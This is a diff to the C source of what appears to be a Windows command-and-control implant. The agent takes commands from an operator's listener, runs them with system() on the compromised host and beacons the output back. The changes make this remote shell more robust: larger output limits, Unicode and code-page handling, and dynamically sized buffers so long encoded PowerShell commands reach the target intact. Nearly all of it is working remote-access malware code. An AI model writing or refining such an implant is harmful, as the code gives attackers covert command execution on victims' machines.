@@ -80,7 +80,11 @@
 
 #define RECV_BUF_SIZE 65536
 #define SEND_BUF_SIZE 65536
-#define MAX_CMD_OUTPUT (32 * 1024)
+/* The same ceiling the Python agent clips a command result at, so how much
+ * output an operator gets does not depend on which payload they dropped. The
+ * buffers a result passes through are sized from the output itself (see
+ * send_output), because escaping can turn one byte of that into six. */
+#define MAX_CMD_OUTPUT (256 * 1024)
 #define BEACON_SIZE 160
 
 static char g_session_id[64] = {0};
@@ -507,19 +511,26 @@ static int tls_decrypt_once(SOCKET s) {
 }
 
 /* Blocking read of one decrypted line; the same shape as the plaintext path
- * below so no caller has to know which one it is on. */
+ * below so no caller has to know which one it is on.
+ *
+ * A line that does not fit is reported as a failure rather than handed back
+ * short. Half a command is not a smaller command: it is a different one, and
+ * the only thing the operator would see is a result that does not match what
+ * they typed. */
 static int tls_readline(SOCKET s, char *buf, int len) {
     int total = 0;
+    int overflow = 0;
 
     for (;;) {
         while (g_tls.plain_off < g_tls.plain_len) {
             char c = g_tls.plain[g_tls.plain_off++];
             if (c == '\n') {
                 buf[total] = '\0';
-                return total;
+                return overflow ? -1 : total;
             }
             if (c == '\r') continue;
             if (total < len - 1) buf[total++] = c;
+            else overflow = 1;
         }
         if (g_tls.plain_off == g_tls.plain_len) {
             g_tls.plain_off = g_tls.plain_len = 0;
@@ -555,19 +566,41 @@ static int agent_readline(SOCKET s, char *buf, int len) {
     if (g_tls_on) return tls_readline(s, buf, len);
 
     int total = 0;
+    int overflow = 0;
     char c;
-    while (total < len - 1) {
+    for (;;) {
         int n = recv(s, &c, 1, 0);
         if (n <= 0) return -1;
         if (c == '\n') break;
         if (c == '\r') continue;
-        buf[total++] = c;
+        if (total < len - 1) buf[total++] = c;
+        else overflow = 1;                /* read to the end, then drop it */
     }
     buf[total] = '\0';
-    return total;
+    return overflow ? -1 : total;
 }
 
 /* ── JSON helpers ── */
+
+static int hex_nibble(char c) {
+    if (c >= '0' && c <= '9') return c - '0';
+    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
+    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
+    return -1;
+}
+
+/* Four hex digits as a number, or -1 if these are not four hex digits. Reading
+ * stops at the first non-digit, so it never walks past the NUL that ends the
+ * string it was called on. */
+static int hex4(const char *p) {
+    int value = 0;
+    for (int k = 0; k < 4; k++) {
+        int d = hex_nibble(p[k]);
+        if (d < 0) return -1;
+        value = value * 16 + d;
+    }
+    return value;
+}
 
 static const char *json_get_string(const char *json, const char *key, char *out, size_t out_sz) {
     char pattern[128];
@@ -578,8 +611,9 @@ static const char *json_get_string(const char *json, const char *key, char *out,
     while (*p && (*p == ' ' || *p == '\t' || *p == ':' || *p == ',')) p++;
     if (*p != '"') { out[0] = '\0'; return NULL; }
     p++;
+    /* Four bytes of room per step because one escape can write that much UTF-8. */
     size_t i = 0;
-    while (*p && *p != '"' && i < out_sz - 1) {
+    while (*p && *p != '"' && i + 4 < out_sz) {
         if (*p == '\\' && p[1]) {
             p++;
             switch (*p) {
@@ -588,6 +622,42 @@ static const char *json_get_string(const char *json, const char *key, char *out,
                 case 't': out[i++] = '\t'; break;
                 case '"': out[i++] = '"'; break;
                 case '\\': out[i++] = '\\'; break;
+                case '/': out[i++] = '/'; break;
+                case 'u': {
+                    /* The listener writes JSON with the default ensure_ascii, so
+                     * a command that is not pure ASCII reaches this agent as
+                     * \uXXXX. Turning it back into the bytes cmd.exe expects is
+                     * what lets an operator type the file name they meant on a
+                     * host that is not on an English code page; leaving it would
+                     * run a command called "u5de5u5177" instead. */
+                    int cp = hex4(p + 1);
+                    if (cp >= 0xD800 && cp <= 0xDBFF && p[5] == '\\' && p[6] == 'u') {
+                        int low = hex4(p + 7);
+                        if (low >= 0xDC00 && low <= 0xDFFF) {
+                            cp = 0x10000 + ((cp - 0xD800) << 10) + (low - 0xDC00);
+                            p += 6;               /* the pair's second escape */
+                        }
+                    }
+                    if (cp < 0 || (cp >= 0xD800 && cp <= 0xDFFF)) {
+                        out[i++] = '?';           /* not a character: one honest byte */
+                    } else if (cp < 0x80) {
+                        out[i++] = (char)cp;
+                    } else if (cp < 0x800) {
+                        out[i++] = (char)(0xC0 | (cp >> 6));
+                        out[i++] = (char)(0x80 | (cp & 0x3F));
+                    } else if (cp < 0x10000) {
+                        out[i++] = (char)(0xE0 | (cp >> 12));
+                        out[i++] = (char)(0x80 | ((cp >> 6) & 0x3F));
+                        out[i++] = (char)(0x80 | (cp & 0x3F));
+                    } else {
+                        out[i++] = (char)(0xF0 | (cp >> 18));
+                        out[i++] = (char)(0x80 | ((cp >> 12) & 0x3F));
+                        out[i++] = (char)(0x80 | ((cp >> 6) & 0x3F));
+                        out[i++] = (char)(0x80 | (cp & 0x3F));
+                    }
+                    p += 4;
+                    break;
+                }
                 default: out[i++] = *p; break;
             }
         } else {
@@ -599,25 +669,49 @@ static const char *json_get_string(const char *json, const char *key, char *out,
     return out;
 }
 
-static void json_escape(const char *src, char *dst, size_t dst_sz) {
+/* One source byte becomes at most six output bytes: a control character is
+ * written as \u00XX. The listener parses these lines with a strict JSON reader,
+ * which rejects a bare byte below 0x20 inside a string — so the old habit of
+ * passing such a byte through did not make the result ugly, it made the whole
+ * message unparsable and lost the command's output. Escaping is what the Python
+ * agent's json.dumps already does.
+ *
+ * It is given a length rather than a C string because command output is
+ * whatever a program wrote: a captured NUL is one character of that output, not
+ * the end of it. */
+static void json_escape(const char *src, size_t src_len, char *dst, size_t dst_sz) {
     size_t j = 0;
-    while (*src && j < dst_sz - 2) {
-        switch (*src) {
+    if (dst_sz < 7) { dst[0] = '\0'; return; }
+    for (size_t i = 0; i < src_len && j + 6 < dst_sz; i++) {
+        unsigned char c = (unsigned char)src[i];
+        switch (c) {
             case '"':  dst[j++] = '\\'; dst[j++] = '"'; break;
             case '\\': dst[j++] = '\\'; dst[j++] = '\\'; break;
             case '\n': dst[j++] = '\\'; dst[j++] = 'n'; break;
             case '\r': dst[j++] = '\\'; dst[j++] = 'r'; break;
             case '\t': dst[j++] = '\\'; dst[j++] = 't'; break;
-            default:   dst[j++] = *src; break;
+            default:
+                if (c < 0x20) {
+                    snprintf(dst + j, 7, "\\u%04x", c);
+                    j += 6;
+                } else {
+                    dst[j++] = (char)c;
+                }
+                break;
         }
-        src++;
     }
     dst[j] = '\0';
 }
 
+/* The room a JSON string of this much text can need, plus the NUL. Callers size
+ * an escape buffer with this and the message off the result, so escaping never
+ * has to drop what it ran out of — which is also what keeps a multi-byte UTF-8
+ * sequence from being cut in half. */
+#define JSON_ESCAPED_MAX(n) ((size_t)(n) * 6 + 1)
+
 /* ── command execution ── */
 
-static void exec_command(const char *cmd, char *out, size_t out_sz) {
+static void exec_command(const char *cmd, char *out, size_t out_sz, size_t *out_len) {
     char tmpfile[MAX_PATH];
     char cmdline[4096];
     DWORD tick = GetTickCount();
@@ -628,15 +722,24 @@ static void exec_command(const char *cmd, char *out, size_t out_sz) {
     int rc = system(cmdline);
 
     FILE *f = NULL;
+    *out_len = 0;
     fopen_s(&f, tmpfile, "r");
     if (f) {
-        size_t nread = fread(out, 1, out_sz - 1, f);
-        out[nread] = '\0';
+        size_t want = out_sz - 1;
+        /* A single fread is allowed to return less than asked for and still have
+         * the file holding more, so keep filling until either runs out. */
+        while (*out_len < want) {
+            size_t n = fread(out + *out_len, 1, want - *out_len, f);
+            if (n == 0) break;
+            *out_len += n;
+        }
         fclose(f);
         DeleteFileA(tmpfile);
     } else {
         snprintf(out, out_sz, "command executed (rc=%d), output capture unavailable", rc);
+        *out_len = strlen(out);
     }
+    out[*out_len] = '\0';
 }
 
 /* ── protocol handlers ── */
@@ -644,15 +747,103 @@ static void exec_command(const char *cmd, char *out, size_t out_sz) {
 static int handle_register(SOCKET s) {
     char escaped_auth[BEACON_SIZE], escaped_host[512], escaped_user[512];
     char msg[SEND_BUF_SIZE];
-    json_escape(AGENT_AUTH, escaped_auth, sizeof(escaped_auth));
-    json_escape(g_hostname, escaped_host, sizeof(escaped_host));
-    json_escape(g_username, escaped_user, sizeof(escaped_user));
+    json_escape(AGENT_AUTH, strlen(AGENT_AUTH), escaped_auth, sizeof(escaped_auth));
+    json_escape(g_hostname, strlen(g_hostname), escaped_host, sizeof(escaped_host));
+    json_escape(g_username, strlen(g_username), escaped_user, sizeof(escaped_user));
     snprintf(msg, sizeof(msg),
              "{\"type\":\"register\",\"auth\":\"%s\",\"hostname\":\"%s\","
              "\"os\":\"windows\",\"arch\":\"x64\",\"username\":\"%s\","
              "\"agent_version\":\"%s\"}",
              escaped_auth, escaped_host, escaped_user, g_agent_version);
     return agent_send(s, msg);
+}
+
+/* What a program printed is in the host's own code page; what JSON has to carry
+ * is UTF-8. This is not a cosmetic mismatch: a byte that is not part of a valid
+ * UTF-8 sequence does not arrive as one odd character, it makes the whole line
+ * undecodable and the command's result never appears. A host whose output is
+ * ASCII is unaffected; a Chinese, Russian or Greek desktop is not.
+ *
+ * The tiers are ordered by how much they keep: strict conversion, then the same
+ * conversion letting Windows substitute for the bytes it cannot read, then a
+ * pass that keeps the ASCII and marks the rest. The last one loses text, and it
+ * exists so the loss is on that result's tail rather than on the message. */
+static char *utf8_from_oem(const char *bytes, size_t len, size_t *out_len) {
+    UINT flags = MB_ERR_INVALID_CHARS;
+    int wn = MultiByteToWideChar(CP_OEMCP, flags, bytes, (int)len, NULL, 0);
+    if (wn <= 0) {
+        wn = MultiByteToWideChar(CP_OEMCP, 0, bytes, (int)len, NULL, 0);
+        flags = 0;
+    }
+    WCHAR *wide = wn > 0 ? (WCHAR *)malloc((size_t)wn * sizeof(WCHAR)) : NULL;
+    char *utf8 = NULL;
+    *out_len = 0;
+
+    if (wide && MultiByteToWideChar(CP_OEMCP, flags, bytes, (int)len, wide, wn) == wn) {
+        int cn = WideCharToMultiByte(CP_UTF8, 0, wide, wn, NULL, 0, NULL, NULL);
+        if (cn > 0) {
+            utf8 = (char *)malloc((size_t)cn + 1);
+            if (utf8 && WideCharToMultiByte(CP_UTF8, 0, wide, wn, utf8, cn, NULL, NULL) == cn) {
+                utf8[cn] = '\0';
+                *out_len = (size_t)cn;
+            } else {
+                free(utf8);
+                utf8 = NULL;
+            }
+        }
+    }
+    free(wide);
+
+    if (!utf8) {
+        utf8 = (char *)malloc(len + 1);
+        if (!utf8) return NULL;
+        size_t j = 0;
+        for (size_t i = 0; i < len; i++)
+            utf8[j++] = (unsigned char)bytes[i] < 0x80 ? bytes[i] : '?';
+        utf8[j] = '\0';
+        *out_len = j;
+    }
+    return utf8;
+}
+
+/* Run one command and report what it printed.
+ *
+ * Every buffer here is sized from the data it has to hold rather than from a
+ * ceiling the data has to fit inside: escaping can turn one byte of output into
+ * six, and a result that runs out of buffer is a result that arrives with its
+ * tail missing and no indication that anything was dropped. */
+static int send_output(SOCKET s, const char *cmd, const char *cmd_id) {
+    char *raw = (char *)malloc(MAX_CMD_OUTPUT);
+    if (!raw) return -1;
+    size_t raw_len = 0;
+    exec_command(cmd, raw, MAX_CMD_OUTPUT, &raw_len);
+
+    size_t text_len = 0;
+    char *text = utf8_from_oem(raw, raw_len, &text_len);
+    free(raw);
+    if (!text) return -1;
+
+    size_t esc_sz = JSON_ESCAPED_MAX(text_len);
+    char *escaped = (char *)malloc(esc_sz);
+    char *msg = NULL;
+    int rc = -1;
+    if (escaped) {
+        json_escape(text, text_len, escaped, esc_sz);
+        /* The framing text plus the three identifiers it carries. */
+        msg = (char *)malloc(esc_sz + 1024);
+    }
+    free(text);
+
+    if (msg) {
+        snprintf(msg, esc_sz + 1024,
+                 "{\"type\":\"output\",\"session_id\":\"%s\","
+                 "\"command_id\":\"%s\",\"beacon\":\"%s\",\"output\":\"%s\"}",
+                 g_session_id, cmd_id, g_beacon, escaped);
+        rc = agent_send(s, msg);
+    }
+    free(escaped);
+    free(msg);
+    return rc;
 }
 
 static int handle_server_msg(SOCKET s, const char *line) {
@@ -714,29 +905,27 @@ static int handle_server_msg(SOCKET s, const char *line) {
                 obj_end++;
             }
             size_t obj_len = (size_t)(obj_end - obj_start);
-            char obj[2048];
-            if (obj_len >= sizeof(obj)) obj_len = sizeof(obj) - 1;
+            /* Both buffers are sized from the object instead of from a fixed
+             * ceiling: a base64-encoded PowerShell command runs past a kilobyte
+             * on its own, and a command truncated here is a different command
+             * on the target, not a command that failed. */
+            char *obj = (char *)malloc(obj_len + 1);
+            char *cmd = NULL;
+            char cmd_id[64] = {0};
+            if (!obj) return -1;
             memcpy(obj, obj_start, obj_len);
             obj[obj_len] = '\0';
 
-            char cmd_id[64] = {0};
-            char cmd[1024] = {0};
-            json_get_string(obj, "command_id", cmd_id, sizeof(cmd_id));
-            json_get_string(obj, "command", cmd, sizeof(cmd));
-
-            if (cmd[0]) {
-                char output[MAX_CMD_OUTPUT];
-                char escaped_out[MAX_CMD_OUTPUT];
-                exec_command(cmd, output, sizeof(output));
-                json_escape(output, escaped_out, sizeof(escaped_out));
-
-                char out_msg[SEND_BUF_SIZE];
-                snprintf(out_msg, sizeof(out_msg),
-                         "{\"type\":\"output\",\"session_id\":\"%s\","
-                         "\"command_id\":\"%s\",\"beacon\":\"%s\",\"output\":\"%s\"}",
-                         g_session_id, cmd_id, g_beacon, escaped_out);
-                if (agent_send(s, out_msg) != 0) return -1;
+            cmd = (char *)malloc(obj_len + 1);
+            if (cmd) {
+                json_get_string(obj, "command_id", cmd_id, sizeof(cmd_id));
+                json_get_string(obj, "command", cmd, obj_len + 1);
             }
+            free(obj);
+
+            int ran = cmd && cmd[0] ? send_output(s, cmd, cmd_id) : 0;
+            free(cmd);
+            if (ran != 0) return -1;
             p = obj_end;
         }
         return 0;
